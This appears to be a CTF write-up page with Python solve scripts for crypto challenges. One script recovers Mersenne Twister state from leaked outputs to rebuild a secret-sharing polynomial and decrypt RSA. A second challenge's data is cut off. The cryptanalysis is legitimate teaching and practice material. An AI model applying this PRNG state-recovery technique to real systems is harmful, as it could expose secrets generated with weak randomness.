<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="SecretShare"><a href="#SecretShare" class="headerlink" title="SecretShare"></a>SecretShare</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><code class="hljs python">res = <span class="hljs-string">&#x27;&#x27;&#x27;27322282703709511636610535806856853612612796524565963685352821215367702697670029638291472271242231649191714479260517868076984065989639273952206721225394449809512736309152963717666213669565294618889004878502587203292128915123582846437035618297859622373514552659661751919687138158714389205196365694996691846589 48569244180151557205855904296808011040310995626104180491157243372509052545941856322458676083637192423759673249488348244220016168699221727901608142636001227515271570470832957720323162015971262916929310707561503164723954043820660896942792324593262461443662124187475159194385198887788939215142063719188348359051</span><br><span class="hljs-string">91805670014258342004112051538515158497977951249015335208828337677065661825541672701641011001509677094927054079355384880161339840664535548572711525978354947655159331190183669338379535914171636373271711777662899462412133698069202075760175522929409084089926367963132890460921167025666146228784502671381146711019 399560428917764748532974912549579755263000603891290776423346071350694440330590365031312031331274402458285677563081638572382883720599282186196046608483533823720739712120092762382758124206813101015928952314835833408960456083078746116580899849811889743359253318716527623535224217277574914341453477162101109304521</span><br><span class="hljs-string">66920426958285786458658248767160362920977647430969423155679844462544037512659182174429654322739226216034435833627040279237803034255254749729584723025199164153117416758037930376665769001615518843769072788984118288795594844920830871790000441610452127329422157793240336858492947908675187651204641324347460068225 544937610110319318485732752819003299421900030583201619755186005418563198983178922830516722630658659738570688423587906326520697827239870483140381321035311084086872965680985895264808839131965351704781276541438910273061170401708989341983455583148675268945159916067944049744805262336310315984482684477033006734287</span><br><span class="hljs-string">5635003138990118507194506070175086831788576611651929217926664518872856396687497543355452282932759792957815071333069987192436081970967301109108636547955400620912244311244917063515500624803643902206301188548901042409824866123277584384961209855675044800618682367677428510425729333590673520619706804051348640739 216744037211012509915361607447276981890614637104708083303422302996997658600655325492799426696396129495740380030328486134561677905050895542824084902986133831827678164847190414920208201189028697970734101241668427915881431218718486605095651504942024880541330783245275847421981881418579001271393784051391703426641</span><br><span class="hljs-string">42911212495890251189243677773682023641022813626312578449123776026147091248993904833237700742589532896024024290404122897946672451644535270088285040557715419433742408043822628453894022912746599564701384030731888203683342200542550299021286164291609827209395613247858235556551967071480178477133096158123879827699 358625812085590413825860316781088505612223852757468112073999439178735803245018313087878704846077887688463179850461438873261474235563220723161414348183847290126780153336526214025645436877174640254582752642464699350692290355463838062957644227630261763964930791440438099097640358707938365934460765509770713422802</span><br><span class="hljs-string">76393649631519338646914577444953093042692772742019473672660460181129677128343169843350211463697634615281051117955282687134957585026912161500321667521577171255986824727912674810018184784281896427202094684250866650111325600908495879530295097533881586073569958225485019114664641193908557023741440163457101525203 329857997030576972729986815876777011654061886138716155424533348668225264710995265453134377944058890193085147694227229106567976594481366856016163332702128728982600129466565167735283489379015199424332093096162272256722421083932784837620468049877168507039726118947169347011547142986416984741443370137649949904461</span><br><span class="hljs-string">79331720524907914908041917436319036255433828287857696014126718015259444328868691897077115926451094233087906865422458137916362681754241848523015955481140065721679824678490152910531795497192050173146826300375546645932629884190392808650921115445830421927238985963684104496062702531620988113510613763043301631209 521812627987763620197812504899506910796946504850708570349667428211492401785051233252744740254058319678959842396710646375803470815528610618211136953181796072686187773678649762524131730689630306575027480171902373722358678386430941181209464823845330723780859962168995759134414896419704465387883718956885830089204</span><br><span class="hljs-string">34982047515239854027766260430773762615551551624040650169394931537920509836795394460680530502277933252344187876902284046236616780767724165813414385632503982500888235012434695560644146038269348824756839799255778718600829638272259933042402900324341026396868817418250681063616205184019449176410323763562609906256 620605218346899770429088593442355698411635752845778736545505196875522232769153705673917137123151382118878693457232039690080398947092819660645917999264381455940649845030563994094759265923737413658758514560434230280086651591011706752452769554749328591613510563389443179182520711924593818729897121279090347342924</span><br><span class="hljs-string">152419925215633402551037300484006425703951620959940334562270582763998688826301000834158083436618204487451531847804246279293440954881219913553470971941979760351736535195521294640333019382215259554425750740788262905693120027837778006639912907313405166887419201498400381605572044667968915799849914769886304855469 534016646028730727016209888504911167747835078463480349483097394578844831015450227232096300754745773717118904569821782762146568167060585024245190142726454552015507956174745334336178848983708347742569471390328051491668238788357493167057460607669219247924675410096486695085439718252206048534436114032676610106347</span><br><span class="hljs-string">7879488845815070796446980042322339499701160196159748256186513316298957679171765636643576866967308539398870809808590995575054707633585889782359230149070757943670854204408729244422811261494912348733104477093541158692065916137178255072991528458124264991587844119002172895462900656781795781239777162351236329010 88871679849011995091477347542680893996957786653924621705917895209560005458566552006873467270402185918706978818367798743110976595300781848502254399030378598802075501163781912730014790884964070072432678736909128727529050058640555516131888412874572332236693843543870582425734398659970857777429709921292338764056</span><br><span class="hljs-string">127514038284722450386599280575918286761060061225148526034466492640545892790142008459404252129894996614536417849770574953585543450549469396103606474736901175227788222676384874264401431651217507860669506781393523454290522077615631381023377385798837961138591946856445250933293025411868935836885350047926486897489 77024841353020037736072564671223528105040202905964518913084686725674447555778849580882283151820241410917813178127609045792603404416216635536183501218256797138848233777386900397758052436048023588018973775841429672943588531118120531410941119451112420484244073744860360930771612798228353879418110447613074103121</span><br><span class="hljs-string">73523397212562449962797322407800812476585158706372414597501601851658987192829920809491154804458216832212324494892234069944533082031068984251998442644045753330748501446440305199570609290581400456976816997103538669480916305434314437973807842397862244118575425198027445648296131215572682266387781847672276278105 358131172545144245017725954943677533669555698100417873957892816178502113778385580423968891034087567143540060215845324391804373505677355257229040486254496477702089813554705646138200115877254745085768546159462550014224359419574896275660358462631189412166193397952134507043404147073495973377634175173793168251233</span><br><span class="hljs-string">147348014782035263557672447461924770257688598176948741569841957313948631675235455168853571742962013610522674191595258437726941866803703946285611136667070559549648062172513441677274884328986422767953568184453855423313870118663236611714535321243624425127415452246621538957156768109051856015526921750034402814181 595636882372433751112400377321820719222073583356736222414778628384644623278463447644996314505722523949309416112422725194730843858188224367723911893838329601709038981556011159397788345709995936511801237268248578658463705897357408752571102163768839107050797667376601808299838509114230891979045461260911946415320</span><br><span class="hljs-string">107396275167806069862891568873373042687841775147343147252292584080352003252925523814251826627764872245643578589633919368796490434000761591564932634968812847926559005905574630301932715978159346119216934096015784765061798867698507880003720720252714582289061793936959096457352973294797409716470781535683208662390 395153432543738329086362624068574193255148332584492341243454102818775521905404929692387305225461869410602734064349062513722129355095148212452014041134124275764033437990333449975234478218955405224252839531173866658663372361601107447751367104423527019655871175001744848253584734158351726745551407103825286804486</span><br><span class="hljs-string">111553464316331929637928443274530253217732988900086332463018159619552721468104642096142476958790984335379754112570481423047457696400188847850295271972015619208861578167810076654492163584804626343101458265888573313262592215690879907819608901681957001286346406746245896172209892822686784252329450759497940157817 511651161619212591638982125008326295422605195202233521320827338823708335474320214987121320809834264020752488400694820412703895872293388034242395958165882000777796549830919064001864919411540442573874044781198129468230793584507078981976925332170577699344654086418908951152825866266645119298895702972413286583958</span><br><span class="hljs-string">152943203796417374728939496393486026220901654584673108139041097288333960510566510856084351323729904924640199712274885275910827036984793221821982353991291820643933058458639690879406578278096815789977814737418245161029735350306516366692394206323956675431185964629143452067819609148096407834611672577927865412392 601919715680710925447421076338078877766683489886991843150153117466383328925764100913643134608445665513170565014760605822708267601346612031986281277217875335899155526135282569237278337539198315798958944970975021604720637053079350115793916435033122479416157536224071649845398032404766802667331247026412465230897</span><br><span class="hljs-string">166939346435092804149361985966477026395490869535977170373479116381554623702088662590719710620315106535772321371981485114999353813392487182004380368980412304867141197881584179316802946420573712884869207029807032629508803275758495901655593573546020371363238621118513519707566850164838945538265367877703756561143 234820987787318061334406237477763453845428872967687650137534289159784627741552971152526376041477941966693305257682995443922827379938186523574311761092208293391813942996139561570362972331975732091581332378414745250571717259039007898729580445364373819332663464831222506646891337600543033325723536694430603794811</span><br><span class="hljs-string">26423433781831557303965218555715659459964805457875828323769054957811368313465747671809917056868138188812894920739462390440860614780050790166810205409831687879766298929374237068956851330280802672993787657036328401560347701569533751904003924033296103431436132762238032533631035466975563403490612905290747500034 564564388847953966153849841262670748320376369154008357907963983929690302350574296789978591185246923974920161797995189321841257011791368992972604074119872162539552292552362460968499190796503841035750507639233595470833894116053816701560762298879109510469040808411623441894361241720213857716595525048872499260906</span><br><span class="hljs-string">67047973882442026847054596043723251652019181826511387455752441275468608245799296406017022023236054643173589545621722148324431435563020855357273526765167504290556087855144498047600331414488129605467552541562176094510433084299150667280746009871632940612151871433089450237469253872190728223812058292760792048327 190023992656957817692909813007060815279103259429273681430127196398700351704377473750794054807013341268132331757606642253453911294388801612173064841530999650755116853772677649649669913317951539550313189351839325961495963700012333982508285993230904890545000476087981313109451079110864357972818329854737276461934</span><br><span class="hljs-string">105924866908333941056520542136279835222849349889633638544229314020165638653054683617844504431167584527725854457445810982830025832114705779346552001573819055283000133195971409988231558773967828820675125138322725072735898886865540351014422681184954059397593545246946913932272750078695992276555307091275819914167 590597067702351181983043135203878889479903130263737024839941242154123057325926009112777887235038694551309864253859910817785607380293492455212053557033975616644911248422981687394189486917578693691299595122658518879946708562394161159104748320544408107959224087679644857953504156164164979544525935685064483284685&#x27;&#x27;&#x27;</span><br>p = <span class="hljs-number">667548632459029899397299221540978856425474915828934339291333387574324630349258515018972045406265448494845331262999241448002076917383740651362641947814545076390796789402373579283727117618532504865966299599663825771187433223531022829811594806917984414530614469374596457149431218829297339079019894262229453357029</span><br>c = <span class="hljs-number">9658009093151541277762773618550582280013680172161026781649630205505443184765264518709081169475689440555639354980432557616120809346519461077355134139495745998317849357705381020225760061125236265304057301286196004542729553944161451832173970613915423841610378207266606500956362098150141825329354727367056070349148059780287916811442861961254066733726576151134458892613951223277692935141880749737598416235307087782001086096114978527447987308876878393763055893556123029990282534497668077854186604106027698257663251502775547705641708624619340185646943640576690633662704397191379303254341343433077302686466850600522990402912</span><br>N = <span class="hljs-number">11790604055677230214731474049594783873473779547159534481643303694816346271798870343160061559787963631020684982858033776446193418629055210874285696446209220404060653230407249409973790191858423402504530660556839353260629987853933304089439885784684686555554108157760445567974629355878575105480273451284714281430590737346099023372211403461861104391534461524711472734572409128196536805998116015230502045333769525693468193385557827209520108839913096017750428926467123493650506193757937746017474062985480713594474378324234033232933140389879312722642144536418253323908290256009510135710208223393009237664704631175216240376891</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inverse_shift</span>(<span class="hljs-params">x, shift, <span class="hljs-built_in">type</span>, mask=<span class="hljs-number">0xffffffff</span>, nbit=<span class="hljs-number">32</span></span>):<br>    res = x<br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(nbit//shift):<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span> == <span class="hljs-string">&#x27;l&#x27;</span>: res = x ^ res &lt;&lt; shift &amp; mask<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span> == <span class="hljs-string">&#x27;r&#x27;</span>: res = x ^ res &gt;&gt; shift &amp; mask<br>    <span class="hljs-keyword">return</span> res<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">crack_extract</span>(<span class="hljs-params">x</span>):<br>    x = inverse_shift(x, <span class="hljs-number">18</span>, <span class="hljs-string">&#x27;r&#x27;</span>)<br>    x = inverse_shift(x, <span class="hljs-number">15</span>, <span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-number">4022730752</span>)<br>    x = inverse_shift(x,  <span class="hljs-number">7</span>, <span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-number">2636928640</span>)<br>    x = inverse_shift(x, <span class="hljs-number">11</span>, <span class="hljs-string">&#x27;r&#x27;</span>)<br>    <span class="hljs-keyword">return</span> x<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract</span>(<span class="hljs-params">x</span>):<br>    y = x<br>    y = y ^ y &gt;&gt; <span class="hljs-number">11</span><br>    y = y ^ y &lt;&lt; <span class="hljs-number">7</span> &amp; <span class="hljs-number">2636928640</span><br>    y = y ^ y &lt;&lt; <span class="hljs-number">15</span> &amp; <span class="hljs-number">4022730752</span><br>    y = y ^ y &gt;&gt; <span class="hljs-number">18</span><br>    <span class="hljs-keyword">return</span> y<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">crack_twist</span>(<span class="hljs-params">cur</span>):<br>    high = <span class="hljs-number">0x80000000</span><br>    low = <span class="hljs-number">0x7fffffff</span><br>    mask = <span class="hljs-number">0x9908b0df</span><br>    state = cur<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">623</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>):<br>        tmp = state[i]^state[(i+<span class="hljs-number">397</span>)%<span class="hljs-number">624</span>]<br>        <span class="hljs-comment"># recover Y,tmp = Y</span><br>        <span class="hljs-keyword">if</span> tmp &amp; high == high:<br>            tmp ^= mask<br>            tmp &lt;&lt;= <span class="hljs-number">1</span><br>            tmp |= <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            tmp &lt;&lt;=<span class="hljs-number">1</span><br>        <span class="hljs-comment"># recover highest bit</span><br>        res = tmp&amp;high<br>        <span class="hljs-comment"># recover other 31 bits,when i =0,it just use the method again it so beautiful!!!!</span><br>        tmp = state[i-<span class="hljs-number">1</span>]^state[(i+<span class="hljs-number">396</span>)%<span class="hljs-number">624</span>]<br>        <span class="hljs-comment"># recover Y,tmp = Y</span><br>        <span class="hljs-keyword">if</span> tmp &amp; high == high:<br>            tmp ^= mask<br>            tmp &lt;&lt;= <span class="hljs-number">1</span><br>            tmp |= <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            tmp &lt;&lt;=<span class="hljs-number">1</span><br>        res |= (tmp)&amp;low<br>        state[i] = res<br>    <span class="hljs-keyword">return</span> state<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">twist</span>(<span class="hljs-params">state</span>):<br>    mt = state[:]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">624</span>):<br>        y = (mt[i] &amp; <span class="hljs-number">0x80000000</span>) + (mt[(i + <span class="hljs-number">1</span>) % <span class="hljs-number">624</span>] &amp; <span class="hljs-number">0x7fffffff</span>)<br>        mt[i] = (y &gt;&gt; <span class="hljs-number">1</span>) ^ mt[(i + <span class="hljs-number">397</span>) % <span class="hljs-number">624</span>]<br>        <span class="hljs-keyword">if</span> y % <span class="hljs-number">2</span> != <span class="hljs-number">0</span>:<br>            mt[i] = mt[i] ^ <span class="hljs-number">0x9908b0df</span><br>    <span class="hljs-keyword">return</span> mt<br><br>res = [[<span class="hljs-built_in">int</span>(_) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> i.split()] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> res.split(<span class="hljs-string">&#x27;\n&#x27;</span>)]<br>X = [i[<span class="hljs-number">0</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> res]<br>out = <span class="hljs-built_in">sum</span>([[<span class="hljs-built_in">int</span>(<span class="hljs-built_in">hex</span>(x)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">256</span>)[i:i+<span class="hljs-number">8</span>], <span class="hljs-number">16</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">256</span>, <span class="hljs-number">8</span>)][::-<span class="hljs-number">1</span>] <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> X], [])<br>out = out[:<span class="hljs-number">624</span>]<br>out = [crack_extract(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> out]<br><br>ans = <span class="hljs-built_in">list</span>()<br>out = crack_twist(out)<br>ans += out<br>out = crack_twist(out)<br>ans = out[-(<span class="hljs-number">640</span>-<span class="hljs-number">624</span>):] + ans<br><br>ans = [extract(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> ans]<br>A = [<span class="hljs-built_in">int</span>(<span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">hex</span>(x)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">8</span>) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> ans[i:i+<span class="hljs-number">32</span>]][::-<span class="hljs-number">1</span>]), <span class="hljs-number">16</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(ans), <span class="hljs-number">32</span>)]<br>A = [<span class="hljs-number">0</span>] + A<br><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">f</span>(<span class="hljs-params">x</span>):<br>    n = <span class="hljs-number">21</span><br>    res = <span class="hljs-number">0</span><br>    tmp = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>        res = (res + tmp * A[i]) % p<br>        tmp = tmp * x % p<br>    <span class="hljs-keyword">return</span> res % p<br><br>secret = (res[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>] - f(res[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>])) % p<br>Q = N // secret<br>d = inverse(<span class="hljs-number">0x10001</span>, N-secret-Q+<span class="hljs-number">1</span>)<br>m = long_to_bytes(<span class="hljs-built_in">pow</span>(c, d, N))<br><span class="hljs-built_in">print</span>(m)<br></code></pre></td></tr></table></figure>

<h2 id="colorful-matrix"><a href="#colorful-matrix" class="headerlink" title="colorful_matrix"></a>colorful_matrix</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python">ns = [<span class="hljs-number">38630062416586710341458654419912504176237737247477839749085033080367529539859992076587411537805430366799412095876782912512744262957062106155418341531142309858429218208463637096843365217114990765965110566415965985105403996944993619708417839598461935470469097206342256014086162845948208599334925650727933097059538199199685364793545286980392966271769914201657672004082101110775504946586957241075964270454872257405872181588544468173017149763827540561921126826597515171761064800381983526515300315517818122598179574900255685121991744205071544970</span>, <span class="hljs-number">41522753602903133841910260331594875922287719226997542592715810409935551768308104573333760854332533376702631593490915962706512143045107096658851885513727202513616813054397657610854303071682604806070009002234312854968365250748142324994926715544722158698813288131533399544263105858513134170084625526223987620550110255872688155827773099232631041345207194483609514502522566888883736218471849075697433311580004701384847571029783514418685068903758509270527252444771313048094566344002411364378658592832008194309873599342916391769027015343562030852</span>, <span class="hljs-number">41542983120532762175372001624404625565366126179958909731196555044290633581761361918706298428954501507557598076910710787422049443564800530253137695341299743714514361560156305534490483794181933110893966453220306980682146624294992100948497284459992930850081254114996830645068636306625330524465991656430799359422407117440063911943625477783216502523414967017151717597372146324488526509879620785458016456593044828784565522423332830549325397893426472247197776412026158371655860380929692662547882654137064941217130915364306358205055760044763651406</span>, <span class="hljs-number">42853015443318352230776688785915441259875645365236808434164117288657978345098324019250085686482568413223085548506789311679316323466083886556772338612177680666217592255234589446979456714341877135596118517098603502394776049958587301113539552072352462301070489369653155854389890761241450743607560719433910573462283304103064437843063566946231984094581307498714742271881862348689297267558023093643893310002803310596286441071314219020032740336515363830250477649030557311461077069407775907176409762823453607196260454965048316567154365877848652918</span>, <span class="hljs-number">31152961872836435078296602982779340735140569916125711058616435902653202922218293684857125091648631460215120167354825278469413413558325850576700866199515219603448136082693185200558425103833947831228064760642508443585470729998592994719564254894176473779555436230174300038353978808432410463449170865897259181312953584408177790825688497584119467820716449210429423337019604137134889051973100340798405991782200038835066294194815913887924272593864934325496116821854183293510325217934617021428710898873475027666892706022106386340733691632884942848</span>]<br>A = [<span class="hljs-number">12789809461864875489953273982997537541385904671489556544122095227619591140533414669794423644619127980362623481580128258914287474542792728686579090501397390</span>, <span class="hljs-number">10463950513938701625808784986819665844287315724639315128677227520960105897990256530542006653611594269012930935073966767351788182657861624733138283749460454</span>, <span class="hljs-number">5253244650607533810967862436125419800679723144526973463211784033045021824966560017919956773745212139142517766154626849426827164032731516615725539069585525</span>, <span class="hljs-number">5644589184984504085855423002268477365020278981591337230721358313393863912025011466727192648804002734561676112555123877764178690726130713927642577324443238</span>, <span class="hljs-number">4231732567865883627242742552738439372803539125622706171540910152922080004603138662537022248675968288205781990968838888633816697065257733344028576518431020</span>, <span class="hljs-number">2483388920404524165854675814798022834892112957478917588986471421083048888193527751575039626887367465858751417977246719312923814782809309525841102293919541</span>, <span class="hljs-number">3252353812256192711411255830105475125944842449239880454539397067913664088094160819193268643401968970009466652179043139341471403913410402646923633696154454</span>, <span class="hljs-number">11575010486066232687430367040977113580882826853104996856464797182632266635060724100357205810604915010810884387573114266349621457564659060272935537811111850</span>, <span class="hljs-number">116107444921917032985259963199427176510900273385517435613848456370557161312731449337837406563733552524777525870560544042690403987311424820755256727586807</span>, <span class="hljs-number">5859050133610438843641532306693688255014116940390205022708310454673159702673207152462501010791971695002865650407033762568636006764435795015869726867643634</span>, <span class="hljs-number">5954075553161305677556950650395792531753502207483036473422070018485916621872566706504374038792527687442272405589975343003802956899043321092006127828986114</span>, <span class="hljs-number">4571747544457157571652286537158051402285727327066029382085461714597609990601683125994983291866807816649968826930652068427193317966970789937746419206862747</span>, <span class="hljs-number">7166507561570980603812241332170524724051295937096000768984168029904561160020043035660087151672164814332446644696618077835020463308343415953131944864257266</span>, <span class="hljs-number">4852042788460566411381271873349329096978244586097817622748766708426751073559942708861852208085367014057217116211249133109246735634468823924185525972777655</span>, <span class="hljs-number">11962941918999276757181090570698839032103646409734781047194175833198626142790676141060052011581957980660140931408560130449153056874213033784715711461403345</span>, <span class="hljs-number">10324508881746579337486319574059121005227580732153432145860775835052420139026016902518605634385512021513380467928195663920843022679549517463264144660593354</span>, <span class="hljs-number">13276257094435850052122403884510025189232513948002582716865201271569293297601525601586036713056700716929820641888489806178376555435219630186396004003438962</span>, <span class="hljs-number">6525051273399089095687950615197786094425890004112675057642687348101531212837185750558500720306108976630502328600886080197626115513445112562084719104488315</span>, <span class="hljs-number">12922888505610354933000354792496863801007995464403098763485264334670452387681468617068312646367483171083114539083453125614861357751571161533921864394641576</span>, <span class="hljs-number">9489726784141062031514945333087338495823600723655465328127755755022980083351477888038160719541864899912899592065620071698977397662002448273876711116012763</span>, <span class="hljs-number">10630316198843195148937849513165933809121991192035364160395429088101265852052098101114542104327663563661384303617672183366879116750889320604308038959012109</span>, <span class="hljs-number">12675564142993964272844760955973914547747654087592111324261755301551267959231076883765863344473167582531968290671984039948163579495803204811731286282708940</span>, <span class="hljs-number">11847724105274460405216443356582445218232627275228120716891711887600046501095390733716854871561352002320819466803698088448952127166615410820121973485089326</span>, <span class="hljs-number">5131676593756685549522564504727003861447389891839469018437277330988047271086971907217360711863971849879439418231726349935396008040776952541710218842744018</span>, <span class="hljs-number">8049060452950901277510497437779182190254362319091882684392717180429468875432078713802857488901441344429723298843967365750616860588029426099852763482179470</span>, <span class="hljs-number">2365060249260571713545479629411006471094806409182638354076861269679377537605360223984548798658469783472746989448405310909017645138161178501458084966625559</span>, <span class="hljs-number">7467521246204465304438401242342633361751371318557249418344587207503257890765643838557008735305668588521988487342275527781708126255070883848829062790678347</span>, <span class="hljs-number">5841608816993144092409175658260479687582056537041472535819914412630519543198558564258699185557903902095773598614097026740427138629173672250387442834578787</span>, <span class="hljs-number">3935779917509948624841228665498558015416911059417306651751360048412619176423173794541812556512582747588138532941031730797102738268660078594473168666677171</span>, <span class="hljs-number">1459083415233950534805962555425717865938763752937036513111696179351002303817986848490146888626704327653287774806488952733813718461674376764427084478395399</span>, <span class="hljs-number">6426876689549337938550615491086475536072547585103523407263007393570982327518298678278232288342601754164640081474537962710401178482959474762541185760732929</span>, <span class="hljs-number">5241364650650467046722868257809607948071188801137204831449976666385482519613365369974704486723941517654753205012497273820309153659423928739972270634209996</span>, <span class="hljs-number">6387483223002092292686097811446217867743566298067033295601210265979889577756648605354064672061975949925472022416479935990178719227937307079186916383092053</span>, <span class="hljs-number">170562164015232424518655058158727202269056868720093972639058422975773575660534168774299548952867348396798580779605954510297102765330549642318362861226163</span>, <span class="hljs-number">10004133230245713370426176448219282796530473722412487408402635996842671302539458739305597027107498342509248085998067976408732789438099488867425813748783724</span>, <span class="hljs-number">12325342879747412722323355648741345730921040452129462974449188258885453690169624888480720109964630270938743431623479816739889661554987977051169401841580388</span>, <span class="hljs-number">641543989928732942291347866597230552820621633110802944556141221591498546555080480758772801043509130524233886009444044150447511986129019395067102094826363</span>]<br>B = [<span class="hljs-number">108715652691370707411987210267535348806</span>, <span class="hljs-number">131676833696101475747102644851662113271</span>, <span class="hljs-number">122436706338521558335484593966234623745</span>, <span class="hljs-number">255864866572301552398412638474857375629</span>, <span class="hljs-number">81098761191414480003681301866161112100</span>, <span class="hljs-number">322322463176364397336266169283851913620</span>, <span class="hljs-number">198167679309202772183020662350938553923</span>, <span class="hljs-number">326360662842236388778385468938922853242</span>, <span class="hljs-number">241812832858991643670485138860832357660</span>, <span class="hljs-number">69768236619183466076110136290750715548</span>, <span class="hljs-number">32383134960394164339076842474280712870</span>, <span class="hljs-number">147747232748027508904245311745435517130</span>, <span class="hljs-number">25327826075608705748116808975774398964</span>, <span class="hljs-number">65295332681674581261444632606267440749</span>, <span class="hljs-number">236756211690281667988216748814564193312</span>, <span class="hljs-number">106435149910135092172124474857722935730</span>, <span class="hljs-number">270727089812520941022075406571244846193</span>, <span class="hljs-number">206881193220261276126028739930244917728</span>, <span class="hljs-number">131961838897694897398340205404861333362</span>, <span class="hljs-number">219211823942216355573832791993673934321</span>, <span class="hljs-number">150960424777134558142309786444952807101</span>, <span class="hljs-number">51112048255939343109218372373173385772</span>, <span class="hljs-number">182065623911902509203036774197184164110</span>, <span class="hljs-number">168420344895532090057957641972492853410</span>, <span class="hljs-number">301808673225362418769168353084541667053</span>, <span class="hljs-number">132272458662433671393247350648662880688</span>, <span class="hljs-number">495672626901999558635736361346563007</span>, <span class="hljs-number">182444159345379042372018248514964944782</span>, <span class="hljs-number">144584137563407779776361378564517880036</span>, <span class="hljs-number">338518705859818740467225748906995999694</span>, <span class="hljs-number">205885429741815676881969528495365151019</span>, <span class="hljs-number">233897982464483450790005953366237992668</span>, <span class="hljs-number">279307677123402840425362992920185630901</span>, <span class="hljs-number">133493426228159673166382443820069696429</span>, <span class="hljs-number">316624110847744871475435405969944304329</span>, <span class="hljs-number">187931604382397525131117897387179435812</span>, <span class="hljs-number">220019728924915067987393012581921164417</span>]<br>enc = <span 